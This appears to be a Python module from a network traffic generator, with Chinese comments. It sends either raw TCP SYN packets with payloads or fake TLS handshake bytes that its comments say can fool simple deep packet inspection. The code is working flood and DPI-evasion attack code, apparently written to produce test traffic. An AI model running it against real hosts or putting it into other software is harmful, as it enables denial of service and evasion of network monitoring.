import socket
import os
import struct
import logging
import random
from typing import Optional, Literal
from .utils import get_interface_ip, bind_socket_to_interface, calculate_payload_size_from_total_size

logger = logging.getLogger("UE-traffic")


class TCPSender:
    def __init__(self, iface: str, tcp_attack_mode: Literal["syn", "lazy_mimic_tls"] = "syn"):
        """
        初始化 TCP 發送器
        
        Args:
            iface: 網路介面名稱
            tcp_attack_mode: TCP 攻擊模式
                - "syn": 傳統 TCP SYN 攻擊（預設）
                - "lazy_mimic_tls": 偽造 TLS 握手攻擊（建立連線後發送偽造 TLS payload）
        """
        self.iface = iface
        self.tcp_attack_mode = tcp_attack_mode
        if not os.path.exists(f"/sys/class/net/{iface}"):
            raise ValueError(f"Interface {iface} does not exist.")
        
        # 在初始化時就獲取該 interface 的 IP 地址
        self.interface_ip = get_interface_ip(iface)
        if self.interface_ip is None:
            logger.warning(f"Could not determine IP address for interface '{iface}'")
            self.interface_ip = "unknown"
        else:
            logger.debug(f"Interface '{iface}' IP: {self.interface_ip}")
        
        # 根據攻擊模式選擇 socket 類型
        if self.tcp_attack_mode == "lazy_mimic_tls":
            # Lazy Mimic TLS 模式：使用普通 TCP socket 建立完整連線
            self.sock = None  # 每次發送時動態創建
            logger.info(f"[{self.iface}] TCP Sender initialized in 'lazy_mimic_tls' mode (HTTPS port 443)")
        else:
            # SYN 模式：使用 raw socket
            self._setup_socket()
            logger.info(f"[{self.iface}] TCP Sender initialized in 'syn' mode")
    
    def _setup_socket(self):
        """創建並綁定 raw socket（僅在初始化時調用一次）- 用於 SYN 模式"""
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            self.sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 0)
            bind_socket_to_interface(self.sock, self.iface)
            logger.debug(f"TCP raw socket created and bound to {self.iface}")
        except Exception as e:
            logger.error(f"Failed to create TCP raw socket: {e}")
            raise

    def _checksum(self, data: bytes) -> int:
        """計算 TCP/IP checksum"""
        if len(data) % 2 != 0:
            data += b'\x00'
        s = sum(struct.unpack('!%sH' % (len(data) // 2), data))
        s = (s >> 16) + (s & 0xffff)
        s += s >> 16
        return ~s & 0xffff

    def _build_tcp_syn_packet(self, src_ip: str, dst_ip: str, src_port: int, dst_port: int, payload_size: int) -> bytes:
        """構建 TCP SYN 封包（含 payload）"""
        # TCP header fields
        seq_num = 0
        ack_num = 0
        data_offset = 5  # TCP header = 20 bytes (5 * 4)
        flags = 0x02  # SYN flag
        window = 65535
        urgent_ptr = 0
        
        # Payload（全 0）
        payload = bytes(payload_size)
        
        # Pseudo header for checksum
        pseudo_header = struct.pack(
            '!4s4sBBH',
            socket.inet_aton(src_ip),
            socket.inet_aton(dst_ip),
            0,
            socket.IPPROTO_TCP,
            20 + len(payload)  # TCP header + payload length
        )
        
        # TCP header (without checksum)
        tcp_header_without_checksum = struct.pack(
            '!HHIIBBHHH',
            src_port,
            dst_port,
            seq_num,
            ack_num,
            (data_offset << 4) | 0,
            flags,
            window,
            0,  # checksum placeholder
            urgent_ptr
        )
        
        # Calculate checksum
        checksum = self._checksum(pseudo_header + tcp_header_without_checksum + payload)
        
        # TCP header (with checksum)
        tcp_header = struct.pack(
            '!HHIIBBH',
            src_port,
            dst_port,
            seq_num,
            ack_num,
            (data_offset << 4) | 0,
            flags,
            window
        ) + struct.pack('H', checksum) + struct.pack('!H', urgent_ptr)
        
        return tcp_header + payload

    def _generate_lazy_mimic_tls_payload(self, data_length: int) -> bytes:
        """
        生成帶有 Magic Header 的偽造 TLS 封包
        
        結構: [0x16 0x03 0x01] + [Length (2 bytes, Big-Endian)] + [Random Garbage]
        
        Args:
            data_length: 垃圾資料的長度（不包含 5 bytes header）
        
        Returns:
            完整的偽造 TLS payload (5 bytes header + garbage)
        
        技術說明：
        - Byte 0: 0x16 = TLS Handshake
        - Byte 1-2: 0x03 0x01 = TLS 1.0 (相容性慣例)
        - Byte 3-4: Payload 長度 (Big-Endian, 2 bytes)
        - Byte 5+: 隨機垃圾資料
        
        這種結構可以欺騙簡單的 DPI (Deep Packet Inspection)，
        但在 Wireshark 中會顯示為 "Malformed Packet"，
        因為實際內容不符合 TLS Client Hello 規範。
        """
        # 1. Magic Header: TLS Handshake (0x16) + TLS 1.0 (0x03 0x01)
        magic_header = b'\x16\x03\x01'
        
        # 2. Length Field: 計算垃圾資料長度並轉為 2-byte Big-Endian
        # struct.pack("!H") = Network order (Big-Endian), Unsigned Short (2 bytes)
        length_bytes = struct.pack("!H", data_length)
        
        # 3. Garbage Body: 隨機生成指定長度的亂碼
        garbage_body = random.randbytes(data_length)
        
        # 4. 組合完整 payload
        full_payload = magic_header + length_bytes + garbage_body
        
        return full_payload

    def _send_lazy_mimic_tls_packet(self, target_ip: str, target_port: int, payload_size: int):
        """
        發送偽造 TLS 握手封包 (Lazy Mimic TLS Attack)
        
        行為流程：
        1. 建立 TCP 連線到目標 (完成三次握手)
        2. 發送偽造的 TLS Client Hello (帶 Magic Header 的隨機資料)
        3. 立即斷線 (不等待回應)
        
        Args:
            target_ip: 目標 IP 地址
            target_port: 目標端口 (通常為 443)
            payload_size: 總封包大小（會轉換為實際 payload）
        
        Returns:
            字典包含發送結果資訊
        """
        sock = None
        try:
            # 創建 TCP socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            
            # 綁定到指定網路介面
            bind_socket_to_interface(sock, self.iface)
            
            # 設定短超時（模擬攻擊效率）
            sock.settimeout(2)
            
            # 連線到目標（完成三次握手）
            sock.connect((target_ip, target_port))
            
            # 獲取本地端口
            src_ip, src_port = sock.getsockname()
            
            # 生成偽造 TLS payload
            # payload_size 是配置中的總大小，需要減去 headers
            # 但這裡我們直接控制應用層 payload 大小
            # 為了與配置一致，使用 payload_size 作為 TLS 偽造資料的參考大小
            tls_data_length = random.randint(100, 300)  # 隨機 100-300 bytes
            fake_tls_payload = self._generate_lazy_mimic_tls_payload(tls_data_length)
            
            # 發送偽造 payload
            sock.send(fake_tls_payload)
            
            logger.debug(
                f"[{self.iface}] Sent Lazy Mimic TLS packet ({len(fake_tls_payload)} bytes) "
                f"from {src_ip}:{src_port} to {target_ip}:{target_port}"
            )
            
            # 立即關閉連線（不等待回應）
            sock.close()
            
            return {
                'src_ip': src_ip,
                'src_port': src_port,
                'dst_ip': target_ip,
                'dst_port': target_port,
                'protocol': 'TCP',
                'success': True
            }
            
        except socket.timeout:
            logger.warning(f"[{self.iface}] Lazy Mimic TLS connection timeout to {target_ip}:{target_port}")
            return {
                'src_ip': self.interface_ip,
                'src_port': 0,
                'dst_ip': target_ip,
                'dst_port': target_port,
                'protocol': 'TCP',
                'success': False,
                'error': 'Connection timeout'
            }
        except Exception as e:
            logger.error(f"[{self.iface}] Lazy Mimic TLS attack failed: {e}")
            return {
                'src_ip': self.interface_ip,
                'src_port': 0,
                'dst_ip': target_ip,
                'dst_port': target_port,
                'protocol': 'TCP',
                'success': False,
                'error': str(e)
            }
        finally:
            if sock:
                try:
                    sock.close()
                except:
                    pass

    def send_packet(self, *, target_ip: str, payload_size: int, target_port: Optional[int] = None):
        """
        發送 TCP 封包（根據 tcp_attack_mode 選擇模式）
        
        - syn 模式：只發送 SYN，不完成三次握手
        - lazy_mimic_tls 模式：建立連線，發送偽造 TLS payload，然後斷線
        """
        # 根據攻擊模式選擇發送方法
        if self.tcp_attack_mode == "lazy_mimic_tls":
            return self._send_lazy_mimic_tls_packet(target_ip, target_port, payload_size)
        
        # 預設：SYN 模式
        try:
            # 計算實際 payload 大小（減去 TCP header）
            # payload_size 參數現在表示總封包大小，而不是 payload 大小
            actual_payload_size = calculate_payload_size_from_total_size('tcp', payload_size)
            
            # 使用目標端口作為源端口
            src_port = target_port
            src_ip = self.interface_ip
            
            # 構建 TCP SYN 封包
            tcp_packet = self._build_tcp_syn_packet(src_ip, target_ip, src_port, target_port, actual_payload_size)
            
            # 發送封包（使用預先創建的 socket）
            self.sock.sendto(tcp_packet, (target_ip, 0))
            
            logger.debug(f"[{self.iface}] Sent TCP SYN with {actual_payload_size} bytes payload (total packet size: {payload_size} bytes) from {src_ip}:{src_port} to {target_ip}:{target_port}")
            
            return {
                'src_ip': src_ip,
                'src_port': src_port,
                'dst_ip': target_ip,
                'dst_port': target_port,
                'protocol': 'TCP',
                'success': True
            }
            
        except Exception as e:
            logger.error(f"[{self.iface}] TCP SYN send failed: {e}")
            return {
                'src_ip': self.interface_ip,
                'src_port': target_port,
                'dst_ip': target_ip,
                'dst_port': target_port,
                'protocol': 'TCP',
                'success': False,
                'error': str(e)
            }
    
    def __del__(self):
        """清理：關閉 socket（僅在 SYN 模式）"""
        try:
            if hasattr(self, 'sock') and self.sock is not None:
                self.sock.close()
        except:
            pass
